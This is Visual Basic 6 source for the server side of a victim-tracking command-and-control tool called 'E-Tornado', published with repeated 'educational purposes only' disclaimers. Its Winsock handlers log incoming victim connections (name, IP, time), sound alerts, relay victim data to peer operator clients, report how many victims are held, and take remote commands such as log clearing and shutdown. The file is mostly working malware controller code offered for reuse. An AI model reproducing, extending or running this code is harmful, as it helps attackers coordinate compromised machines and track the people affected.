Private Sub lstWin_ColumnClick(ByVal ColumnHeader As MSComctlLib.ColumnHeader)
    'for listview sorting
     LVXS.Sort True, ColumnHeader.Index, Val(ColumnHeader.Index)
   
End Sub

Private Sub lstWin_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = vbRightButton Then
        PopupMenu mainlist2
    End If
End Sub

Private Sub lstWin2_Click()
    On Error Resume Next
    Text2.Text = lstWin2.ListItems(lstWin2.SelectedItem.Index).ListSubItems(1).Text

End Sub

Private Sub lstWin2_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = vbRightButton Then
        PopupMenu clientlist
    End If
End Sub





Private Sub lvButtons_H1_Click()
    Form2.Show
End Sub

Private Sub lvButtons_H10_Click()
    Open Form2.Text4.Text & "\new.txt" For Output As #1
        Print #1, "cleaned at " & Time & "  on the " & Date
    Close #1
    
    Open Form2.Text4.Text & "\old.txt" For Output As #1
        Print #1, "cleaned at " & Time & "  on the " & Date
    Close #1
End Sub

Private Sub lvButtons_H11_Click()
    saveall
End Sub

Private Sub lvButtons_H2_Click()
    
    On Error Resume Next
    Winsock3.RemoteHost = Text2.Text
    On Error Resume Next
    Winsock3.SendData "..|" & Text1.Text
    logit "Signal " & Text1.Text & " sent to " & Text2.Text
    
End Sub

Private Sub lvButtons_H3_Click()
    Form3.Show
End Sub




'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!


Private Sub lvButtons_H4_Click()
    Open Form2.Text3.Text & "\logs.txt" For Output As #1
        Print #1, "cleaned at " & Time & "  on the " & Date
    Close #1
       
End Sub

Private Sub lvButtons_H5_Click()
    On Error GoTo ErrH
    
    Dim sPath As String
    
                '   Open the Browse Folder dialog box and
                '   return the folder selected
        sPath = SelectFolder(Me, "Select folder")
      
      
                '   If no folder was selected, exit here
        If Len(sPath) = 0 Then
            Form2.Text3.Text = "No folder selected"
            Exit Sub
        Else
            Form2.Text3.Text = sPath
        End If
    
    Exit Sub
        
ErrH:
    Exit Sub
    'MsgBox Err.Number & Chr(10) & Err.Description
End Sub

Private Sub lvButtons_H6_Click()
    ShellExecute hwnd, "open", Form2.Text3.Text, vbNullString, vbNullString, conSwNormal

End Sub

Private Sub lvButtons_H7_Click()
    Open Form2.Text3.Text & "\logs.txt" For Output As #1
        Print #1, "cleaned at " & Time & "  on the " & Date
    Close #1
End Sub

Private Sub lvButtons_H8_Click()
    On Error GoTo ErrH
    
    Dim sPath As String
    
                '   Open the Browse Folder dialog box and
                '   return the folder selected
        sPath = SelectFolder(Me, "Select folder")
      
      
                '   If no folder was selected, exit here
        If Len(sPath) = 0 Then
            Form2.Text4.Text = "No folder selected"
            Exit Sub
        Else
            Form2.Text4.Text = sPath
        End If
    
    Exit Sub
        
ErrH:
    Exit Sub
    'MsgBox Err.Number & Chr(10) & Err.Description
End Sub

Private Sub lvButtons_H9_Click()
    ShellExecute hwnd, "open", Form2.Text4.Text, vbNullString, vbNullString, conSwNormal
End Sub

Private Sub modifyip3_Click()
    Dim isselected As Boolean
    Dim xcounter As Long
        
        For xcounter = 1 To lstWin2.ListItems.Count
            If lstWin2.ListItems.Item(xcounter).Checked = True Then
                isselected = True
            End If
        Next xcounter
    
    If (isselected) Then
    
        Dim i As Integer
        With lstWin2
          
            For i = .ListItems.Count To 1 Step -1
    
    
                If .ListItems(i).Checked Then
                    
                    Dim comment As String
                    comment = InputBox("Please enter the new ip address", "Input")
                    .ListItems(i).ListSubItems(1).Text = comment
                End If
            Next i
        End With
    Else
            MsgBox "Please Select an item from the filter list"
    End If
End Sub

Private Sub RichTextBox1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = vbRightButton Then
        PopupMenu reachtext
    End If
End Sub

Private Sub save4_Click()
 
 If Form2.Check4.Value = 1 Then
    Open Form2.Text3.Text & "\logs.txt" For Append As #1
        Print #1, Form1.RichTextBox1.Text
    Close #1
 End If
    
End Sub

Private Sub savelist_Click()
    
    
     savefilterlist

End Sub



Public Sub savefilterlist()
    'save filter to file

    Dim isselected As Boolean
    Dim xcounter As Long

    
    
       
    Open App.path & "/data/filter.txt" For Output As #1
    
 
        For xcounter = 1 To Me.listview1.ListItems.Count
            Set lItem = listview1.ListItems.Item(xcounter)
            Print #1, Me.listview1.ListItems.Item(xcounter) & "|" & lItem.ListSubItems.Item(1) & "|" & lItem.ListSubItems.Item(2)
                
        Next xcounter
   
    Close #1

End Sub

Private Sub selectall_Click()

    Dim i As Long
    
    With listview1
                
        For i = .ListItems.Count To 1 Step -1
            If .ListItems(i).Checked = False Then
                .ListItems.Item(i).Checked = True
            End If
        Next i
    End With

End Sub

Private Sub selectall2_Click()
    Dim i As Long
    
    With lstWin
                
        For i = .ListItems.Count To 1 Step -1
            If .ListItems(i).Checked = False Then
                .ListItems.Item(i).Checked = True
            End If
        Next i
    End With
End Sub

Private Sub selectall3_Click()
    Dim i As Long
    
    With lstWin2
                
        For i = .ListItems.Count To 1 Step -1
            If .ListItems(i).Checked = False Then
                .ListItems.Item(i).Checked = True
            End If
        Next i
    End With
End Sub






Private Sub soundtimer_Timer()
    
        Call PlaySoundResource(102)
        
End Sub

Private Sub stopsound_Click()
    Me.soundtimer.Enabled = False
End Sub


'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!




Private Sub Timer1_Timer()
Call PlaySoundResource(102)
End Sub

Private Sub Timer2_Timer()
    Form1.Text7 = 0
    Timer2.Enabled = False
End Sub



Private Sub Timer5_Timer()

End Sub

Private Sub updater_Timer()
        Label3.Caption = "Total: " & listview1.ListItems.Count
        Label4.Caption = "Total: " & lstWin.ListItems.Count
        Label5.Caption = "Total: " & lstWin2.ListItems.Count
        
        
        
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
    Dim reply As String
    Dim connect2vic As Boolean
    connect2vic = False
    
    Winsock1.GetData reply
    
    
   
    'stop sorting when adding
    LVXS.Sort False
    If Left(reply, 1) = "|" Then
        Form3.List1.AddItem reply
        
        'tray pop up msg
        If Form2.Check7.Value = 1 Then
            ctxSysTray1.Popup reply, "E-Tornado", Information
        End If
        
        
        Form3.Label6.Caption = "Total: " & Form3.List1.ListCount
        logit reply
    ElseIf Left(reply, 1) = "%" Then
        logit reply
                
        'resend signal to clients
        If Form2.Check3.Value = 1 Then
          
                 Dim xcounter As Long
                 For xcounter = 1 To lstWin2.ListItems.Count
                     
                     Winsock3.RemoteHost = lstWin2.ListItems(xcounter).ListSubItems(1).Text
                     On Error Resume Next
                     Call Form11.GotoSleep(1, 1)
                     Winsock3.SendData reply
                     
                     
                                                               
                 Next xcounter
         End If
    ElseIf Left(reply, 1) = "#" Then
        logit reply
                
        'resend signal to clients
        If Form2.Check3.Value = 1 Then
          
            Dim xcounter5 As Long
            For xcounter5 = 1 To lstWin2.ListItems.Count
                     
                Winsock3.RemoteHost = lstWin2.ListItems(xcounter5).ListSubItems(1).Text
                On Error Resume Next
                Call Form11.GotoSleep(1, 1)
                Winsock3.SendData reply
                     
                     
                                                               
            Next xcounter5
             
        End If
 
        
        
        
        
        
    ElseIf InStr(Trim(reply), "|") > 0 Then
    'check before adding the signal
       
       striN = Split(reply, "|")
       Set lItem = lstWin.ListItems.Add(, , striN(0), , 0)
       lItem.ListSubItems.Add , , striN(1)
       lItem.ListSubItems.Add , , striN(3)
       lItem.ListSubItems.Add , , Winsock1.RemoteHostIP
       lItem.ListSubItems.Add , , striN(2)
       lItem.ListSubItems.Add , , striN(4)
       lItem.ListSubItems.Add , , Date
       lItem.ListSubItems.Add , , Time
        
       'tray pop up msg
       If Form2.Check7.Value = 1 Then
            ctxSysTray1.Popup reply, "E-Tornado", Information
       End If
        
        'play sound
        If Form2.Check5.Value = 1 Then
            Call PlaySoundResource(103)
        End If
        
        'check if is in filter
        Dim l As Long
        For l = 1 To listview1.ListItems.Count
    
         If InStr(Trim(reply), listview1.ListItems(l).Text) > 0 Then
            If listview1.ListItems(l).ListSubItems(1).Text = "yes" Then
                Me.soundtimer.Enabled = True
                lItem.ListSubItems.Add , , "yes"
                Call PlaySoundResource(102)
            Else
                lItem.ListSubItems.Add , , "no"
            End If
         End If
          
        Next l
       
       connect2vic = True
       
       
        
    Else
        Form3.List1.AddItem reply
        Form3.Label6.Caption = "Total: " & Form3.List1.ListCount
        logit reply
        
       'tray pop up msg
       If Form2.Check7.Value = 1 Then
            ctxSysTray1.Popup reply, "E-Tornado", Information
       End If
    End If
    
    LVXS.Sort True
 
   

     
    'resend to clients the victim info
    If Form2.Check3.Value = 1 Then
       ' If CharCount(reply, "|") = 4 Then
             Dim xcounter3 As Long
             For xcounter3 = 1 To lstWin2.ListItems.Count
                 
                 Winsock3.RemoteHost = lstWin2.ListItems(xcounter3).ListSubItems(1).Text
                 On Error Resume Next
                 Call Form11.GotoSleep(1, 1)
                 
                 If connect2vic = True Then
                    Winsock3.SendData "622415|" & reply + "|" + Winsock1.RemoteHostIP
                 Else
                    Winsock3.SendData "...|" & reply + "|" + Winsock1.RemoteHostIP
                 End If
                 'log it
                 logit "Victim info sent to " & lstWin2.ListItems(xcounter3).ListSubItems(1).Text
            
                                          
             Next xcounter3
         ' End If
    End If
    
    
    If Form3.Check4.Value = 1 Then
    
        If Text7 = 0 Then
            Form11.victimip.Text = Winsock1.RemoteHostIP
        End If
    Else
        If Text7 = 0 And connect2vic = True Then
            Form11.victimip.Text = Winsock1.RemoteHostIP
        End If
    
    End If
    
   


End Sub


'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!



Private Sub Winsock2_DataArrival(ByVal bytesTotal As Long)
    Dim reply As String
    Dim thename As String
    Winsock2.GetData reply
    
    
    If reply = "clearlog" Then
          
        Open Form2.Text3.Text & "\logs.txt" For Output As #1
            Print #1, "cleaned at " & Time & "  on the " & Date
        Close #1
        
        
    ElseIf reply = "clearallcus" Then
        lstWin.ListItems.Clear
    ElseIf reply = "clearallwol" Then
        lstWin2.ListItems.Clear
    ElseIf reply = "clearfillter" Then
        listview1.ListItems.Clear
    ElseIf reply = "clearform3.list1" Then
        Form3.List1.Clear
    ElseIf reply = "shutdown" Then
        End
    ElseIf Left(reply, 6) = "542891" Then
    
   
        striN = Split(reply, "|")
            
             thename = striN(2)
             
            'remove duplicates
             Dim xcounter As Long
              
             For xcounter = 1 To lstWin2.ListItems.Count
                 
                 On Error Resume Next
                 If lstWin2.ListItems.Item(xcounter).Text = thename Then
                     lstWin2.ListItems.Remove (xcounter)
                     
                 End If
             Next xcounter
                         
            Set lItem = lstWin2.ListItems.Add(, , thename, , 0)
            lItem.ListSubItems.Add , , striN(1)
            lItem.ListSubItems.Add , , Date
            lItem.ListSubItems.Add , , Time
            lItem.ListSubItems.Add , , striN(3)
    End If
         
         
     'log off code
    If Left(reply, 1) = "#" Then
         
         logit (reply)
    End If
         
    'resend to clients the clients info
    If Form2.Check1.Value = 1 Then
        Dim xcounter1 As Long
        For xcounter1 = 1 To lstWin2.ListItems.Count
        
            Winsock3.RemoteHost = lstWin2.ListItems(xcounter1).ListSubItems(1).Text
            On Error Resume Next
            Call Form11.GotoSleep(1, 1)
            
            Winsock3.SendData reply
            'log it
            logit "Client info sent to " & lstWin2.ListItems(xcounter1).ListSubItems(1).Text
        Next xcounter1
    End If
    
    
    
           
           
           
           
           
        

    
 
End Sub




Private Sub Winsock4_DataArrival(ByVal bytesTotal As Long)
    Dim reply4 As String
    Winsock4.GetData reply4
    Winsock4.RemoteHost = Winsock4.RemoteHostIP
    
    
    If reply4 = "getstatus" And Text7 = 0 Then
        Winsock3.SendData "Free waiting for victims"
    ElseIf reply4 = "getstatus" And Text7 = 1 Then
        Winsock3.SendData "Busy With " & Form11.victimip.Text
    ElseIf reply4 = "getcount" Then
        Winsock3.SendData "Server has a total of " & lstWin.ListItems.Count & " victims"
    ElseIf reply4 = "victimlist" Then
    
        'send victim list
        
        Dim xcounter1, xc2 As Long
            
            Winsock3.RemoteHost = Winsock4.RemoteHostIP
            On Error Resume Next
            Call Form11.GotoSleep(1, 1)
            
            For xc2 = 1 To lstWin.ListItems.Count
                Winsock3.SendData "622415|" & lstWin.ListItems(xc2).Text & "|" & lstWin.ListItems(xc2).ListSubItems(1).Text & "|" & lstWin.ListItems(xc2).ListSubItems(4).Text & "|" & lstWin.ListItems(xc2).ListSubItems(2).Text & "|" & lstWin.ListItems(xc2).ListSubItems(5).Text & "|" & lstWin.ListItems(xc2).ListSubItems(3).Text & "|" & lstWin.ListItems(xc2).ListSubItems(6).Text & "|" & lstWin.ListItems(xc2).ListSubItems(7).Text
                            
            Next xc2
           
            
            'log it
            logit "Victim list sent to " & lstWin2.ListItems(xcounter1).ListSubItems(1).Text
                      
    ElseIf reply4 = "clientlist" Then
    
            'send CLIENT list
        
            Dim xcounter2, xc3 As Long
            
            Winsock3.RemoteHost = Winsock4.RemoteHostIP
            On Error Resume Next
            Call Form11.GotoSleep(1, 1)
            
            For xc3 = 1 To lstWin2.ListItems.Count
                Winsock3.SendData "542891|" & lstWin2.ListItems(xc3).Text & "|" & lstWin2.ListItems(xc3).ListSubItems(1).Text & "|" & lstWin2.ListItems(xc3).ListSubItems(2).Text & "|" & lstWin2.ListItems(xc3).ListSubItems(3).Text & "|" & lstWin2.ListItems(xc3).ListSubItems(4).Text
            Next xc3
           
            
            'log it
            logit "Victim list sent to " & lstWin2.ListItems(xcounter2).ListSubItems(1).Text
                      
          ElseIf reply4 = "oldlist" Then
    
            'send CLIENT list
        
            Dim xc4, xcounter3 As Long
            
            Winsock3.RemoteHost = Winsock4.RemoteHostIP
            On Error Resume Next
            Call Form11.GotoSleep(1, 1)
            
            For xc4 = 0 To Form3.List1.ListCount
                Winsock3.SendData "...|" & Form3.List1.List(xc4)
            Next xc4
           
            
            'log it
            logit "Old victim list sent to " & lstWin2.ListItems(xcounter3).ListSubItems(1).Text
             
                      
                      
                      
    End If

End Sub



'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!





'count charector occurance
Public Function CharCount(OrigString As String, _
  Chars As String, Optional CaseSensitive As Boolean = False) _
  As Long

'**********************************************
'PURPOSE: Returns Number of occurrences of a character or
'or a character sequencence within a string

'PARAMETERS:
    'OrigString: String to Search in
    'Chars: Character(s) to search for
    'CaseSensitive (Optional): Do a case sensitive search
    'Defaults to false

'RETURNS:
    'Number of Occurrences of Chars in OrigString

'EXAMPLES:
'Debug.Print CharCount("FreeVBCode.com", "E") -- returns 3
'Debug.Print CharCount("FreeVBCode.com", "E", True) -- returns 0
'Debug.Print CharCount("FreeVBCode.com", "co") -- returns 2
''**********************************************

Dim lLen As Long
Dim lCharLen As Long
Dim lAns As Long
Dim sInput As String
Dim sChar As String
Dim lCtr As Long
Dim lEndOfLoop As Long
Dim bytCompareType As Byte

sInput = OrigString
If sInput = "" Then Exit Function
lLen = Len(sInput)
lCharLen = Len(Chars)
lEndOfLoop = (lLen - lCharLen) + 1
bytCompareType = IIf(CaseSensitive, vbBinaryCompare, _
   vbTextCompare)

    For lCtr = 1 To lEndOfLoop
        sChar = Mid(sInput, lCtr, lCharLen)
        If StrComp(sChar, Chars, bytCompareType) = 0 Then _
            lAns = lAns + 1
    Next

CharCount = lAns

End Function

'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!










